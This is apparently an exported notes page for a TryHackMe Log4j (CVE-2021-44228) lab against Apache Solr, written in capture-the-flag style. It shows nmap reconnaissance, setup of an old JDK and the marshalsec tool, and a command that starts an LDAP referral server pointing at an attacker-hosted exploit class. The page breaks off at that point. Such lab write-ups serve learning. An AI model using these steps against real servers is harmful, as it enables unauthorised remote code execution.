@@ -1,0 +1,755 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Log4j</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+}
+
+.simple-table-header {
+	background: rgb(247, 246, 243);
+	color: black;
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="21e6a499-1456-44cc-ba24-8dddfff42ebd" class="page sans"><header><img class="page-cover-image" src="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/log4j-banner.png" style="object-position:center 50%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/ea9887327658c30d21fdbcc63a2b9691.png"/></div><h1 class="page-title">Log4j</h1></header><div class="page-body"><p id="014240f4-a3ec-461f-b2e6-8cd6201c4d2a" class="">IP :10.10.8.20</p><p id="44b922a1-0d4d-4eec-9921-e20a5531b6f1" class="">
+</p><p id="a2634861-093b-47e5-973b-7f48732818a9" class="">tryhackme Log4j room:</p><figure id="70e37e53-8ce0-4652-9c70-a6f8fccc33cc"><a href="https://tryhackme.com/room/solar" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">TryHackMe | Solar, exploiting log4j</div><div class="bookmark-description">Explore CVE-2021-44228, a vulnerability in log4j affecting almost all software under the sun.</div></div><div class="bookmark-href"><img src="https://assets.tryhackme.com/img/favicon.png" class="icon bookmark-icon"/>https://tryhackme.com/room/solar</div></div><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/ea9887327658c30d21fdbcc63a2b9691.png" class="bookmark-image"/></a></figure><p id="cbbd7c62-1040-43b0-81e9-7454f27558af" class="">
+</p><p id="91bda76a-d8bd-447f-8b3b-46f7177fc842" class="">Kshitij Raj </p><p id="4fea3289-da4d-45c5-b310-073bc9e9d897" class="">tryhackme:</p><figure id="eacb6aee-1f9d-4077-96bb-6e559c744945"><a href="https://tryhackme.com/p/krzio" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">TryHackMe | krzio</div><div class="bookmark-description">TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs, all through your browser!</div></div><div class="bookmark-href"><img src="https://assets.tryhackme.com/img/favicon.png" class="icon bookmark-icon"/>https://tryhackme.com/p/krzio</div></div><img src="https://tryhackme-images.s3.amazonaws.com/user-avatars/053fa89ecbeeda50e71612a8afe82e62.jpg" class="bookmark-image"/></a></figure><h1 id="1900c616-a1be-423a-b524-0462c3f924c6" class="">Reconnaissance</h1><p id="e9367d60-bb04-4e60-81c4-52ba3f2baf36" class="">Using  nmap for scanning ports</p><pre id="f0faa2e5-cc84-4c82-a825-3d63ecfde239" class="code"><code>nmap -v 10.10.8.20</code></pre><figure id="3f2ee80e-cba1-4d2f-afe6-5f5c9908a5e5" class="image"><a href="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled.png"><img style="width:1920px" src="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled.png"/></a></figure><p id="a5cbb42a-fa09-4c5f-9468-08df0eb65e7c" class="">
+</p><pre id="c9966382-7db8-44d4-99d6-530c20ad6875" class="code"><code>nmap -sV -v -p 8983 10.10.8.20</code></pre><p id="86522178-a434-42c7-8af3-455c545f726c" class="">
+</p><pre id="defaa235-8373-4b18-a27e-367e9e374974" class="code"><code>
+root@ip-10-10-195-37:~# nmap -v  -sV -p 8983 10.10.8.20
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2021-12-14 11:56 GMT
+NSE: Loaded 42 scripts for scanning.
+Initiating ARP Ping Scan at 11:56
+Scanning 10.10.29.198 [1 port]
+Completed ARP Ping Scan at 11:56, 0.23s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 11:56
+Completed Parallel DNS resolution of 1 host. at 11:56, 0.00s elapsed
+Initiating SYN Stealth Scan at 11:56
+Scanning ip-10-10-29-198.eu-west-1.compute.internal (10.10.29.198) [1 port]
+Discovered open port 8983/tcp on 10.10.29.198
+Completed SYN Stealth Scan at 11:56, 0.22s elapsed (1 total ports)
+Initiating Service scan at 11:56
+Scanning 1 service on ip-10-10-29-198.eu-west-1.compute.internal (10.10.29.198)
+Completed Service scan at 11:56, 11.29s elapsed (1 service on 1 host)
+NSE: Script scanning 10.10.29.198.
+Initiating NSE at 11:56
+Completed NSE at 11:56, 0.78s elapsed
+Initiating NSE at 11:56
+Completed NSE at 11:56, 0.00s elapsed
+Nmap scan report for ip-10-10-29-198.eu-west-1.compute.internal (10.10.29.198)
+Host is up (0.00033s latency).
+
+PORT     STATE SERVICE VERSION
+8983/tcp open  http    Apache Solr
+MAC Address: 02:A0:39:01:E1:F1 (Unknown)
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.99 seconds
+           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)</code></pre><p id="79d7bc60-e816-49cb-9ae4-1aafe3c69bfc" class="">
+</p><p id="63c1dcb9-e61a-4b89-840e-30c7c302bcce" class="">Found service Apache Solr running vulnerable to log4j.</p><p id="4df14946-bc63-4a35-bf1a-ac0a8ba1d786" class="">
+</p><hr id="00cbd863-f99c-4f3e-8d3f-5b9a3eab6652"/><p id="678c8e74-8aaf-40d5-8361-f9fcb6a0cf00" class="">
+</p><h1 id="d3d9c799-1d32-4d39-9e53-a2a044843a25" class="">Discovery</h1><p id="2475e993-0765-4e0e-9261-51ee37a19fdf" class="">
+</p><p id="3d4c2196-a4c4-4e20-950e-8948a9aa3197" class="">Lets explore site</p><figure id="37fe0e32-e2bb-4323-ae40-738eb48a3bf3" class="image"><a href="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%201.png"><img style="width:1918px" src="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%201.png"/></a></figure><p id="59b511ca-98dc-4765-9140-763411ab2c11" class="">
+</p><p id="dcbff32f-d84f-45fb-919b-acae1ad92916" class="">Found that -Dsolr.log.dir is set to open /var/solr/log </p><figure id="a24aede4-f18f-4751-b1e6-f91b57ae8807" class="image"><a href="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%202.png"><img style="width:1920px" src="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%202.png"/></a></figure><p id="f54491e8-72bf-473c-8f6f-3deae9c32563" class="">Found most INFO keyword in this log and also found path .</p><p id="0b36b9de-4a59-41a5-a111-60ac0ba25a2b" class="">
+</p><p id="2022a315-defb-41ee-8e64-689ef7ee9bdb" class="">In this log File we found entry point as &#x27;params{}&#x27; as this doesn&#x27;t contain any thing </p><p id="a34797e8-57b4-4417-9b6b-8ace2aa10b5a" class="">
+</p><p id="3702e8c3-2483-4a32-b8ab-dc8cf74ea8f1" class="">
+</p><hr id="0413324f-d09a-4c84-82b2-db960aadd155"/><p id="063bb836-7c80-4d94-8e36-046c7b49284f" class="">
+</p><h1 id="234b1187-8d3e-4033-9fb7-dfc6c520dabc" class="">Proof Of Concept (POC)</h1><p id="a1a100ba-ab76-4adf-8a0d-b874190a72bc" class="">
+</p><figure id="6fb88f1b-c83d-4957-9e26-a66481487ff8" class="image"><a href="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%203.png"><img style="width:921px" src="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%203.png"/></a></figure><p id="d3f06e50-84d7-4543-bd4a-e1baf314c750" class="">use ifconfig to find the ip address</p><p id="bea1727b-a3dc-48e9-b354-8aa50d985134" class="">
+</p><figure id="38a52e97-077a-4648-ac42-ec79a30d73ad" class="image"><a href="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%204.png"><img style="width:913px" src="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%204.png"/></a></figure><p id="c5bb8f54-b086-45b1-8d03-4bdc3c804658" class="">
+</p><p id="09a3fc14-ad4a-4b35-930f-f02eb79bdc53" class="">Used to this payload to get reverse shell</p><p id="b495dc46-0f75-4f99-833f-f432b525674f" class="">
+</p><figure id="29cbfe58-5427-4deb-9f7c-8f31216d90c2" class="image"><a href="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%205.png"><img style="width:920px" src="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%205.png"/></a></figure><p id="5b44dbed-1e90-4863-a273-14aa1cc81df5" class="">
+</p><p id="e3a4670c-b96b-4056-8918-eba531e85ce4" class="">Got reverse shell on net cat</p><p id="61792c82-aba6-493a-b12f-ba68b27c9ac7" class="">
+</p><hr id="5d2d0d8f-0952-4f76-aaf1-1bae79e94281"/><p id="ff4b9684-efa1-469d-87b9-88924a3f0130" class="">
+</p><h1 id="4ebb33ee-e0f6-4796-9d44-9a60b713f562" class="">Exploitation</h1><p id="ed91fccc-ab4d-4e3c-823e-45819a76a80e" class="">
+</p><p id="9925b3d4-cf15-473e-b456-9bcd5e8531e5" class="">We need jdk8u_181 file to exploit this vulnerability , we can download it form here</p><p id="deb34726-47a1-438a-8b72-a1598d0cbc0e" class="">
+</p><p id="3360c701-c9a5-4354-bee7-a6bed99d0f9a" class="">link : <a href="http://mirrors.rootpei.com/jdk/">http://mirrors.rootpei.com/jdk/</a></p><p id="57763268-09b9-4d64-9b00-ae2ab3b41e4e" class="">
+</p><p id="9981de06-c60a-4b49-9d8b-21e81aff2701" class="">note: use IDM for faster download if u are getting low speed</p><p id="7614ab14-2dba-4512-8e12-34486fde802d" class="">
+</p><p id="6a58aacd-f260-402e-a807-0847b9894795" class="">then  need to set it as our current java environment , Using these steps</p><pre id="182dd67b-fc7f-4189-8b8c-249280e6c473" class="code"><code>sudo mkdir /usr/lib/jvm 
+cd /usr/lib/jvm
+
+sudo tar xzvf ~/Downloads/jdk-8u181-linux-x64.tar.gz    # modify as needed
+
+sudo update-alternatives --install &quot;/usr/bin/java&quot; &quot;java&quot; &quot;/usr/lib/jvm/jdk1.8.0_181/bin/java&quot; 1
+sudo update-alternatives --install &quot;/usr/bin/javac&quot; &quot;javac&quot; &quot;/usr/lib/jvm/jdk1.8.0_181/bin/javac&quot; 1
+sudo update-alternatives --install &quot;/usr/bin/javaws&quot; &quot;javaws&quot; &quot;/usr/lib/jvm/jdk1.8.0_181/bin/javaws&quot; 1
+
+sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
+sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
+sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws</code></pre><p id="5ddba0ee-d130-4e8b-873c-6cfc8ea4b9a4" class="">u can check ur java version as shown in below</p><figure id="2a45f0d9-0662-4bd6-a549-c81c02b61403" class="image"><a href="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%206.png"><img style="width:666px" src="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%206.png"/></a></figure><p id="ed383e67-09f3-4648-b209-1954c9c25fd0" class="">Then install maven for building next tool</p><pre id="d9784140-ee40-46bf-a67e-a8ebdecd715d" class="code"><code>sudo apt install maven </code></pre><p id="c310f265-3dfe-493b-8e10-477cf859f690" class="">
+</p><p id="7eb9d2f9-f145-44e5-9a59-8b358c1606a5" class="">We need a tool by marshalsec  , get it from GIT</p><p id="d8ab5d4b-7dd3-4657-9db1-2ef767c16f86" class="">
+</p><pre id="2b731d0b-5719-49ef-98ab-dd6da77c5ccc" class="code"><code>git clone https://github.com/mbechler/marshalsec</code></pre><p id="7ecf9ba1-a00e-4d7e-87f1-052a1ae166b4" class="">
+</p><p id="15a02184-5aa0-4c53-bd46-880475dcaaae" class="">change ur working directory to marshalsec and build this file using maven </p><p id="56c02f92-b4e0-437c-a86f-0fbf077f6bdf" class="">
+</p><p id="bcb1d2c2-1d97-4a83-aa2e-804078bedbe3" class="">
+</p><pre id="dc6be84f-dcc5-417f-9d88-336a552c0edb" class="code"><code>mvn clean package -DskipTests</code></pre><p id="91f61ac0-a617-49a6-96b5-f458f05661b0" class="">Using marshalsec we are making LDAP referral server to get connection to our secondary HTTP server , which we will built in next steps </p><p id="3a6cfd59-fbc5-424a-9113-7ee51f313f2c" class="">after successful build this message will display</p><p id="95e39e26-d6b1-482b-abd2-2fb86e730b56" class="">
+</p><figure id="80f390c0-1ba9-4acf-844f-0713ca0ded45" class="image"><a href="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%207.png"><img style="width:1563px" src="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%207.png"/></a></figure><p id="0a88f2bb-1e68-4c60-9ac3-894572ab853d" class="">
+</p><p id="5c0c57c0-663e-4c6e-a2cf-54e32b72dce2" class="">
+</p><pre id="df4029a2-c81f-497f-81b1-9b2dc84814b4" class="code"><code>java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://10.9.12.6:8000/#Exploit&quot;</code></pre><p id="36b56f4f-92fb-4709-a939-49ea4b99ab60" class="">
